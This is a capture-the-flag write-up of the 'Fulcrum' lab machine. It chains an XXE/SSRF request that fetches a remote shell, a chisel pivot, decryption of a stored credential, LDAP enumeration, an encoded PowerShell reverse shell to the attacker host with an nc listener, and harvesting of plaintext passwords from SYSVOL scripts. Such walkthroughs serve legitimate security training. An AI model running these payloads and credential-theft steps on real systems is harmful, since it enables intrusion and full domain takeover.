### Foothold
XXE via SSRF RFI
```bash burp
POST / HTTP/1.1
Host: 10.129.136.254:56423
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 97
Content-Type: application/x-www-form-urlencoded

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://127.0.0.1:4?page=http://10.10.16.4/shell"> %xxe; ]>
```


### Enum
```bash
www-data@fulcrum:/$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.136.254  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb9:1ca5  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:1ca5  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:1c:a5  txqueuelen 1000  (Ethernet)
        RX packets 44713  bytes 3725374 (3.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37371  bytes 2770079 (2.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 84984  bytes 6720253 (6.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 84984  bytes 6720253 (6.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

virbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        ether 52:54:00:97:17:b7  txqueuelen 1000  (Ethernet)
        RX packets 8065  bytes 600443 (600.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2220  bytes 210995 (210.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@fulcrum:/$ arp -n
Address                  HWtype  HWaddress           Flags Mask            Iface
10.129.0.1               ether   00:50:56:b9:ac:f1   C                     ens160
192.168.122.132          ether   52:54:00:9e:52:f3   C                     virbr0
192.168.122.130          ether   52:54:00:9e:52:f2   C                     virbr0
192.168.122.228          ether   52:54:00:9e:52:f4   C                     virbr0

for i in {1..254}; do (ping -c 1 192.168.122.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 192.168.122.228: icmp_seq=1 ttl=128 time=93.0 ms
```

I have uploaded a statically compiled version of Nmap to Fulcrum. It seems that .228 is identified as WEB01 since ports 80 and 5985 are open.

Founding in /uploads
```bash
www-data@fulcrum:~/uploads$ cat Fulcrum_Upload_to_Corp.ps1 
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1

# on kali
pwsh
PowerShell 7.2.6
Copyright (c) Microsoft Corporation.
```

```powershell
┌──(kali㉿kali)-[/home/kali]
└─PS> $1 = 'WebUser'

┌──(kali㉿kali)-[/home/kali]
└─PS> $2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','

┌──(kali㉿kali)-[/home/kali]
└─PS> $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='

┌──(kali㉿kali)-[/home/kali]
└─PS> $4 = $3 | ConvertTo-SecureString -key $2

┌──(kali㉿kali)-[/home/kali]
└─PS> $5 = New-Object System.Management.Automation.PSCredential ($1, $4)

┌──(kali㉿kali)-[/home/kali]
└─PS> $5

UserName                     Password
--------                     --------
WebUser  System.Security.SecureString

┌──(kali㉿kali)-[/home/kali]
└─PS> $5.GetNetworkCredential() | fl

UserName       : WebUser
Password       : M4ng£m£ntPa55
SecurePassword : System.Security.SecureString
Domain         : 
```


### Pivoting socks since using evil-winrm
```bash kali
❯ locate chisel
/usr/share/powershell-empire/empire/server/modules/powershell/management/invoke_sharpchisel.yaml
/usr/share/powershell-empire/empire/server/plugins/ChiselServer-Plugin/chiselserver.plugin
/usr/share/powershell-empire/empire/server/plugins/ChiselServer-Plugin/chiselserver_darwin
/usr/share/powershell-empire/empire/server/plugins/ChiselServer-Plugin/chiselserver_linux
❯ cp /usr/share/powershell-empire/empire/server/plugins/ChiselServer-Plugin/chiselserver_linux .
❯ mv chiselserver_linux chisel
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.136.254 - - [19/May/2023 13:37:25] "GET /chisel HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

❯ /usr/share/powershell-empire/empire/server/plugins/ChiselServer-Plugin/chiselserver_linux server -p 9000 --reverse
2023/05/19 13:38:44 server: Reverse tunnelling enabled
2023/05/19 13:38:44 server: Fingerprint BA2ys5TYjn00IIhiYU3TgiXz9lCwzzNsBc4zNBZhdGM=
2023/05/19 13:38:44 server: Listening on http://0.0.0.0:9000
2023/05/19 13:39:20 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```bash victim
www-data@fulcrum:/tmp$ wget http://10.10.16.4/chisel
--2023-05-19 01:37:02--  http://10.10.16.4/chisel
Connecting to 10.10.16.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8339456 (8.0M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]   7.95M  1.48MB/s    in 9.6s    

2023-05-19 01:37:12 (848 KB/s) - ‘chisel’ saved [8339456/8339456]

www-data@fulcrum:/tmp$ chmod +x chisel 
www-data@fulcrum:/tmp$ ./chisel client 10.10.16.4:9000 R:socks
2023/05/19 01:38:55 client: Connecting to ws://10.10.16.4:9000
2023/05/19 01:38:57 client: Connected (Latency 136.708531ms)
```

```bash
cat /etc/proxychains4.conf 
...[snip]...
[ProxyList]
socks5  127.0.0.1 1080
```
### Shell as Webuser
```bash
proxychains evil-winrm -i 192.168.122.228 -u WebUser -p M4ng£m£ntPa55
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.122.228:5985  ...  OK
*Evil-WinRM* PS C:\Users\WebUser\Documents> whoami
webserver\webuser
```

```powershell evil-winrm
*Evil-WinRM* PS C:\Users\WebUser\Documents> ls C:\inetpub\wwwroot
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.122.228:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.122.228:5985  ...  OK


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2022   2:46 AM            703 iisstart.htm
-a----         5/8/2022   2:46 AM          99710 iisstart.png
-a----        2/12/2022  11:42 PM           5252 index.htm
-a----        2/12/2022  11:42 PM           1280 web.config


*Evil-WinRM* PS C:\Users\WebUser\Documents> cat C:\inetpub\wwwroot\web.config
```

The `web.config` contains cres for LDAP later on.

### LDAP
##### Raw PowerShell LDAP Background
Based on the account name and the previous comments, it appears to be a sensible decision to query the Active Directory domain. To perform an LDAP query from PowerShell, you would need to create a `DirectoryEntry` object. These objects are referenced as `System.DirectoryServices.DirectoryEntry` or `ADSI`. There are multiple constructors available to create an object, but I'll utilize the one that allows me to pass the username and password.

Next I’ll create an `ADSISearcher` (short for System.DirectoryServices.DirectorySearcher), using this constructor: `public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot, string filter);` This is the constructor for the `DirectorySearcher` object in PowerShell. It creates a new instance of the `DirectorySearcher` class using the specified search root and filter.

Search for users using the DirectorySearcher object, you can use the following code:
```powershell
$searcher = New-Object System.DirectoryServices.DirectorySearcher($adsi)
$searcher.Filter = "(&(objectClass=user)(objectCategory=person))"
$searcher.FindAll()

 C:\Users\WebUser\Documents> $searcher.Filter = "(&(objectClass=user)(objectCategory=person))"
*Evil-WinRM* PS C:\Users\WebUser\Documents> $searcher.FindAll()

Path                                                                  Properties
----                                                                  ----------
LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local {logoncount, codepage, objectcategory, description...}
LDAP://dc.fulcrum.local/CN=Guest,CN=Users,DC=fulcrum,DC=local         {logoncount, codepage, objectcategory, description...}
LDAP://dc.fulcrum.local/CN=krbtgt,CN=Users,DC=fulcrum,DC=local        {logoncount, codepage, objectcategory, description...}
LDAP://dc.fulcrum.local/CN=ldap,CN=Users,DC=fulcrum,DC=local          {samaccountname, givenname, codepage, objectcategory...}
LDAP://dc.fulcrum.local/CN=923a,CN=Users,DC=fulcrum,DC=local          {samaccountname, givenname, codepage, objectcategory...}
LDAP://dc.fulcrum.local/CN=BTables,CN=Users,DC=fulcrum,DC=local       {samaccountname, givenname, codepage, objectcategory...}
```

`(objectCategory=person)` is not necessary.

```powershell
$searcher = New-Object System.DirectoryServices.DirectorySearcher($adsi)
$searcher.Filter = "(&(objectClass=user)(samAccountName=BTables))"
$searchResult = $searcher.FindOne()

*Evil-WinRM* PS C:\Users\WebUser\Documents> $searchResult.Properties

Name                           Value
----                           -----
samaccountname                 {BTables}
givenname                      {BTables}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local}
dscorepropagationdata          {1/1/1601 12:00:00 AM}
usnchanged                     {16404}
instancetype                   {4}
logoncount                     {1}
name                           {BTables}
badpasswordtime                {0}
pwdlastset                     {132964669694854344}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
lastlogontimestamp             {132965813265089947}
streetaddress                  {unknown}
usncreated                     {12628}
sn                             {BTables}
company                        {fulcrum}
objectguid                     {211 177 93 142 140 210 161 74 180 157 245 248 33 105 89 254}
info                           {Password set to ++FileServerLogon12345++}
whencreated                    {5/8/2022 7:02:49 AM}
adspath                        {LDAP://dc.fulcrum.local/CN=BTables,CN=Users,DC=fulcrum,DC=local}
useraccountcontrol             {66048}
cn                             {BTables}
countrycode                    {0}
l                              {unknown}
primarygroupid                 {513}
whenchanged                    {5/9/2022 2:48:46 PM}
c                              {UK}
lastlogon                      {132965813265089947}
distinguishedname              {CN=BTables,CN=Users,DC=fulcrum,DC=local}
st                             {UN}
postalcode                     {12345}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 216 239 5 69 222 106 231 38 26 113 214 180 81 4 0 0}
lastlogoff                     {0}
accountexpires                 {9223372036854775807}
```

One last thing, check Domain Admins with the query
```powershell
$searcher = New-Object System.DirectoryServices.DirectorySearcher($adsi)
$searcher.Filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=fulcrum,DC=local))"

*Evil-WinRM* PS C:\Users\WebUser\Documents> $searcher.FindAll()

Path                                                                  Properties
----                                                                  ----------
LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local {logoncount, codepage, objectcategory, description...}
LDAP://dc.fulcrum.local/CN=923a,CN=Users,DC=fulcrum,DC=local          {samaccountname, givenname, codepage, objectcategory...}
```

By asking ChatAI like new bing, we don't even need `powerview.ps1` anymore.
e.g.
```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> $searcher.FindAll() | ForEach-Object {Write-Host "Name: $($_.Properties['name'])"; Write-Host "Info: $($_.Properties['info'])";Write-Host "------------------------"}

Name: Administrator
Info:
------------------------
Name: Guest
Info:
------------------------
Name: DC
Info:
------------------------
Name: krbtgt
Info:
------------------------
Name: ldap
Info:
------------------------
Name: 923a
Info:
------------------------
Name: BTables
Info: Password set to ++FileServerLogon12345++
------------------------
Name: FILE
Info:
------------------------
```
### Identify the File Server
```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> ping -a 192.168.122.132

Pinging FILE [192.168.122.132] with 32 bytes of data:


Ping statistics for 192.168.122.132:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
*Evil-WinRM* PS C:\Users\WebUser\Documents> ping -a 192.168.122.130

Pinging DC [192.168.122.130] with 32 bytes of data:


Ping statistics for 192.168.122.130:
    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),
```

If you have found the hostname of the machine you are looking for, you can try combining it with the domain name of the network to get the fully qualified domain name (FQDN) of the machine. The FQDN is typically in the format ``<hostname>.<domainname>``.

For example, if the domain name of your network is fulcrum.local and the hostname of the machine you are looking for is FILE, then the FQDN of the machine would be FILE.fulcrum.local.

### User flag
Searching for: how to run command on remote computer using powershell

Yes, you can use the `Invoke-Command` cmdlet in PowerShell to run commands on a remote computer. Here's an example:

```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock { <command> }
```

Replace `<computername>` with the name of the remote computer and `<command>` with the command you want to run.

For example, if you want to run the `Get-Process` command on a remote computer named `FILE.fulcrum.local`, you can use the following command:

```powershell
Invoke-Command -ComputerName FILE.fulcrum.local -ScriptBlock { Get-Process }
```

You can also use the `-Credential` parameter to specify the credentials of an account that has permission to run commands on the remote computer.

For example, if you want to run the `Get-Process` command on a remote computer named `FILE.fulcrum.local` using the credentials of an account named `BTables`, you can use the following commands:

```powershell
$username = 'BTables'
$password = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $password)
Invoke-Command -ComputerName FILE.fulcrum.local -Credential $cred -ScriptBlock { Get-Process }
```

It's possible that you need to specify the domain name along with the username. You can try using the following format for the username:

```powershell
<domain>\<username>
```


```powershell
$username = 'fulcrum\BTables'
$password = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $password)
Invoke-Command -ComputerName FILE.fulcrum.local -Credential $cred -ScriptBlock { type c:\Users\BTables\Desktop\user.txt }

```

### Shell as btables
##### Get SMB shares
```powershell
Invoke-Command -ComputerName FILE.fulcrum.local -Credential $cred -ScriptBlock { Get-SmbShare | select name }

name   PSComputerName     RunspaceId
----   --------------     ----------
ADMIN$ FILE.fulcrum.local d1bea30f-13fa-4018-9ae5-39faecb70f1c
C$     FILE.fulcrum.local d1bea30f-13fa-4018-9ae5-39faecb70f1c
IPC$   FILE.fulcrum.local d1bea30f-13fa-4018-9ae5-39faecb70f1c

New-SmbMapping -RemotePath '\\FILE.fulcrum.local\IPC$'

-Username '<username>' -Password '<password>'
```

##### Get outbound port for reverseshell
Here is an example of how to use the Test-NetConnection cmdlet in PowerShell to test connectivity to a remote computer by checking for open/closed ports:

```powershell
Test-NetConnection -ComputerName <RemoteComputer> -Port <PortNumber>
```

For example, if you want to test connectivity to a remote computer with IP address 192.168.1.1 on port 80, you can use the following command:

```powershell
Test-NetConnection -ComputerName 192.168.1.1 -Port 80
```

You can also use the Test-Connection cmdlet to send ICMP echo request packets ("ping") to one or more computers and receive corresponding ICMP echo reply packets. Here is an example of how to use the Test-Connection cmdlet:

```powershell
Test-Connection -ComputerName <RemoteComputer> -Count <NumberOfPings>
```

For example, if you want to send 3 ICMP echo request packets ("ping") to a remote computer with IP address 192.168.1.1, you can use the following command:

```powershell
Test-Connection -ComputerName 192.168.1.1 -Count 3
```

Source: Conversation with Bing, 19/05/2023
(1) Test-NetConnection (NetTCPIP) | Microsoft Learn. https://learn.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps.
(2) How-to use Test-NetConnection in PowerShell — LazyAdmin. https://lazyadmin.nl/powershell/test-netconnection/.
(3) Test-Connection (Microsoft.PowerShell.Management) - PowerShell. https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/test-connection?view=powershell-7.3.

We need the `Test-NetConnection` here only.

```powershell
*Evil-WinRM* PS C:\Users\WebUser\Documents> Invoke-Command -ComputerName FILE.fulcrum.local -Credential $cred -ScriptBlock { Test-NetConnection -ComputerName 192.168.122.228 -Port 80 }

PSComputerName           : FILE.fulcrum.local
RunspaceId               : 98d44475-57e1-4e9a-a677-025a765facbd
ComputerName             : 192.168.122.228
RemoteAddress            : 192.168.122.228
ResolvedAddresses        : {192.168.122.228}
PingSucceeded            : False
PingReplyDetails         :
TcpClientSocket          :
TcpTestSucceeded         : True
RemotePort               : 80
TraceRoute               :
Detailed                 : False
InterfaceAlias           :
InterfaceIndex           : 0
InterfaceDescription     :
NetAdapter               :
NetRoute                 :
SourceAddress            :
NameResolutionSucceeded  : True
BasicNameResolution      : {}
LLMNRNetbiosRecords      : {}
DNSOnlyRecords           : {}
AllNameResolutionResults :
IsAdmin                  : False
NetworkIsolationContext  :
MatchingIPsecRules       :
```

##### Shell
```powershell
$username = 'fulcrum\BTables'
$password = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $password)
Invoke-Command -ComputerName FILE.fulcrum.local -Credential $cred -ScriptBlock { powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAiACwAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== }
```

on kali
```bash
sudo rlwrap -cAr nc -lvnp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.136.254] 49893
whoami
fulcrum\btables
```
### Root as 923a [DC]
##### ChatGPT save the day
If you are unable to list the shares using `net view`, `Get-WmiObject` or `Set-Location`, but able to connect to specific default shares like NETLOGON and SYSVOL by specifying them in the net use command, it indicates that those shares are accessible and there might be specific permissions or configurations in place for those shares.
```powershell
PS C:\Users\BTables\Documents> net use \\dc.fulcrum.local\SYSVOL /user:fulcrum\btables ++FileServerLogon12345++
The command completed successfully.

PS C:\Users\BTables\Documents> Select-String -Path "\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\*.ps1" -Pattern 923a 

\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\3807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:$Pass 
= '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:$User 
= '923a'


PS C:\Users\BTables\Documents> cat \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1
# Map network drive v1.0
$User = '923a'
$Pass = '@fulcrum_bf392748ef4e_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred
```

```powershell
$username = 'fulcrum\923a'
$password = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $password)
Invoke-Command -ComputerName dc.fulcrum.local -Credential $cred -ScriptBlock { type c:\Users\923a\Desktop\root.txt }
```